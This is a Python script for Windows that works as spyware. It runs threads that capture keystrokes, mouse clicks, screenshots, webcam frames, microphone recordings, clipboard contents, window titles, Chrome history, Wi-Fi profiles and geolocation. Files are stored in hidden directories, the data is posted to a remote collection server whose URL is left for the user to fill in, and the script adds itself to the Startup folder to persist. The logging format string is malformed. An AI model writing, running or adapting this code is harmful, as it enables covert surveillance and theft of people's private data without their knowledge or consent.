import os
import cv2
import pyperclip
import sys
from pynput import keyboard, mouse
import threading
import geocoder
import psutil
import time
import requests
import json
import platform
from PIL import ImageGrab
import logging
import uuid
import shutil
import subprocess
import pythoncom
import win32gui
import wmi
import ctypes
import sounddevice as sd
import sqlite3
from scipy.io import wavfile as wav
import datetime
import bluetooth
import winshell
from win32com.client import Dispatch
import socket

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime%s - %(levelname)s - %(message)s')

# Generate a unique ID for the user/client
client_id = str(uuid.uuid4())

# Function to send data to the server, including the client ID
def send_data_to_server(data):
    url = 'http://127.0.0.1:3000/data'  # Replace with your server URL
    data['client_id'] = client_id  # Include the client ID in the data
    try:
        response = requests.post(url, json=data)
        logging.info(f'Sent data to server: {response.status_code}')
    except requests.exceptions.RequestException as e:
        logging.error(f'Failed to send data to server: {e}')

def get_local_ip():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip

def send_data_to_remote_server(data):
    url = "http://127.0.0.1:3000/data"
    response = requests.post(url, json=data)
    return response.status_code

# Function to create a hidden directory
def create_hidden_directory(path):
    if not os.path.exists(path):
        os.makedirs(path)
        # Set the directory as hidden
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)

# Function to monitor keyboard events
def listen_keyboard():
    def on_press(key):
        data = {'event': 'key_press', 'key': str(key), 'timestamp': time.time()}
        send_data_to_server(data)
        logging.info(f'Key pressed: {key}')
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Function to monitor mouse events
def listen_mouse():
    def on_click(x, y, button, pressed):
        data = {'event': 'mouse_click', 'position': (x, y), 'button': str(button), 'pressed': pressed, 'timestamp': time.time()}
        send_data_to_server(data)
        logging.info(f'Mouse clicked at ({x}, {y}) with {button}')
    with mouse.Listener(on_click=on_click) as listener:
        listener.join()

# Function to capture screenshots
def capture_screenshots():
    hidden_dir = os.path.join(os.path.expanduser('~'), 'hidden_screenshots')
    create_hidden_directory(hidden_dir)
    while True:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(hidden_dir, f'screenshot_{time.time()}.png')
        screenshot.save(screenshot_path)
        data = {'event': 'screenshot', 'path': screenshot_path, 'timestamp': time.time()}
        send_data_to_server(data)
        time.sleep(60)

# Function to capture webcam video
def capture_webcam_video():
    cap = cv2.VideoCapture(0)
    hidden_dir = os.path.join(os.path.expanduser('~'), 'hidden_webcam_videos')
    create_hidden_directory(hidden_dir)
    while True:
        ret, frame = cap.read()
        if ret:
            video_path = os.path.join(hidden_dir, f'webcam_{time.time()}.jpg')
            cv2.imwrite(video_path, frame)
            data = {'event': 'webcam_video', 'path': video_path, 'timestamp': time.time()}
            send_data_to_server(data)
        time.sleep(60)

# Function to monitor USB devices
def monitor_usb():
    try:
        pythoncom.CoInitialize()
        c = wmi.WMI()
        for usb in c.Win32_USBHub():
            data = {'event': 'usb_device', 'device_id': usb.DeviceID, 'timestamp': time.time()}
            send_data_to_server(data)
            logging.info(f'USB device found: {usb.DeviceID}')
    except Exception as e:
        logging.error(f'Error monitoring USB devices: {e}')
    finally:
        pythoncom.CoUninitialize()

# Function to monitor network connections
def monitor_network_connections():
    for conn in psutil.net_connections():
        data = {'event': 'network_connection', 'connection': str(conn), 'timestamp': time.time()}
        send_data_to_server(data)
        logging.info(f'Network connection: {conn}')

# Function to monitor Bluetooth devices
def monitor_bluetooth_devices():
    nearby_devices = bluetooth.discover_devices()
    for bdaddr in nearby_devices:
        data = {'event': 'bluetooth_device', 'address': bdaddr, 'timestamp': time.time()}
        send_data_to_server(data)
        logging.info(f'Bluetooth device found: {bdaddr}')

# Function to collect clipboard data
def collect_clipboard_data():
    while True:
        clipboard_data = pyperclip.paste()
        data = {'event': 'clipboard_data', 'data': clipboard_data, 'timestamp': time.time()}
        send_data_to_server(data)
        logging.info(f'Clipboard data: {clipboard_data}')
        time.sleep(60)

# Function to collect active window titles
def collect_active_window():
    while True:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        data = {'event': 'active_window', 'title': title, 'timestamp': time.time()}
        send_data_to_server(data)
        logging.info(f'Active window title: {title}')
        time.sleep(60)

# Function to collect system information
def collect_system_info():
    system_info = platform.uname()
    data = {
        'event': 'system_info',
        'system_info': system_info._asdict(),
        'timestamp': time.time()
    }
    send_data_to_server(data)
    logging.info(f'System info: {system_info}')

# Function to collect geolocation
def collect_geolocation():
    location = geocoder.ip('me')
    data = {'event': 'geolocation', 'location': location.latlng, 'timestamp': time.time()}
    send_data_to_server(data)
    logging.info(f'Geolocation: {location.latlng}')

# Function to collect browser history (example for Chrome)
def collect_browser_history():
    try:
        history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
        temp_history_path = os.path.expanduser('~') + r'\AppData\Local\Temp\History'
        shutil.copy2(history_path, temp_history_path)
        conn = sqlite3.connect(temp_history_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
        history = []
        for row in cursor.fetchall():
            history.append({
                'url': row[0],
                'title': row[1],
                'visit_count': row[2],
                'last_visit_time': datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=row[3])
            })
        conn.close()
        os.remove(temp_history_path)
        data = {'event': 'browser_history', 'history': history, 'timestamp': time.time()}
        send_data_to_server(data)
        logging.info(f'Browser history: {history}')
    except Exception as e:
        logging.error(f'Error collecting browser history: {e}')

# Function to collect Wi-Fi details
def collect_wifi_details():
    try:
        wifi_details = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
        data = {'event': 'wifi_details', 'details': wifi_details.decode('utf-8'), 'timestamp': time.time()}
        send_data_to_server(data)
        logging.info(f'Wi-Fi details: {wifi_details}')
    except Exception as e:
        logging.error(f'Error collecting Wi-Fi details: {e}')

# Function to record voice
def record_voice():
    fs = 44100  # Sample rate
    seconds = 10  # Duration of recording
    device = 1  # Replace with the correct device index based on the output of sd.query_devices()
    hidden_dir = os.path.join(os.path.expanduser('~'), 'hidden_voice_recordings')
    create_hidden_directory(hidden_dir)
    while True:
        try:
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, device=device)
            sd.wait()  # Wait until recording is finished
            voice_path = os.path.join(hidden_dir, f'voice_{time.time()}.wav')
            wav.write(voice_path, fs, myrecording)
            data = {'event': 'voice_recording', 'path': voice_path, 'timestamp': time.time()}
            send_data_to_server(data)
            logging.info(f'Voice recording saved: {voice_path}')
        except sd.PortAudioError as e:
            logging.error(f'PortAudioError recording voice: {e}')
            device = None  # Reset device to None to re-query devices
        except Exception as e:
            logging.error(f'Error recording voice: {e}')
        time.sleep(60)

# Function to add the script to startup
def add_to_startup():
    startup_folder = winshell.startup()
    script_path = os.path.abspath(__file__)
    shortcut_path = os.path.join(startup_folder, "StartPythonScript.lnk")
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = sys.executable
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.IconLocation = sys.executable
    shortcut.save()

# Main function to start all threads
def main():
    logging.info("Starting script...")
    add_to_startup()
    logging.info("Added to startup.")
    
    threading.Thread(target=listen_keyboard, daemon=True).start()
    logging.info("Started keyboard listener thread.")
    
    threading.Thread(target=listen_mouse, daemon=True).start()
    logging.info("Started mouse listener thread.")
    
    threading.Thread(target=capture_screenshots, daemon=True).start()
    logging.info("Started screenshot capture thread.")
    
    threading.Thread(target=capture_webcam_video, daemon=True).start()
    logging.info("Started webcam video capture thread.")
    
    threading.Thread(target=monitor_usb, daemon=True).start()
    logging.info("Started USB monitor thread.")
    
    threading.Thread(target=monitor_network_connections, daemon=True).start()
    logging.info("Started network connections monitor thread.")
    
    threading.Thread(target=monitor_bluetooth_devices, daemon=True).start()
    logging.info("Started Bluetooth devices monitor thread.")
    
    threading.Thread(target=collect_clipboard_data, daemon=True).start()
    logging.info("Started clipboard data collection thread.")
    
    threading.Thread(target=collect_active_window, daemon=True).start()
    logging.info("Started active window collection thread.")
    
    threading.Thread(target=collect_system_info, daemon=True).start()
    logging.info("Started system info collection thread.")
    
    threading.Thread(target=collect_geolocation, daemon=True).start()
    logging.info("Started geolocation collection thread.")
    
    threading.Thread(target=collect_browser_history, daemon=True).start()
    logging.info("Started browser history collection thread.")
    
    threading.Thread(target=collect_wifi_details, daemon=True).start()
    logging.info("Started Wi-Fi details collection thread.")
    
    threading.Thread(target=record_voice, daemon=True).start()
    logging.info("Started voice recording thread.")
    
    # Example data to send
    data = {
        "example_key": "example_value",
        "local_ip": get_local_ip()
    }
    
    status_code = send_data_to_remote_server(data)
    if status_code == 200:
        print("Data sent successfully")
    else:
        print(f"Failed to send data, status code: {status_code}")

    # Keep the script running
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()